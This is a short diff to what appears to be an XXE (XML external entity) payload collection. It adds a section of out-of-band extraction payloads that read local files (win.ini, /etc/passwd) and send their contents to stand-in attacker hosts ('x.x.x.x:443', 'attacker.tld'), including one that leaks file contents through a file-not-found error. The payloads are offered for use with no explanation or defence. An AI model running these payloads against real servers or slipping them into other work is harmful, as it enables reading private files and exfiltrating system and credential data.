@@ -5,6 +5,9 @@
 ]>
 <r>&sp;</r>
 
+---------------------------------------------------------------
+OoB extraction
+---------------------------------------------------------------
 
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -16,3 +19,18 @@
 
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+------------------------------------------------------------------
+File-not-found exception based extraction
+------------------------------------------------------------------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
+  %one;
+  %two;
+  %four;
+]>
+
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
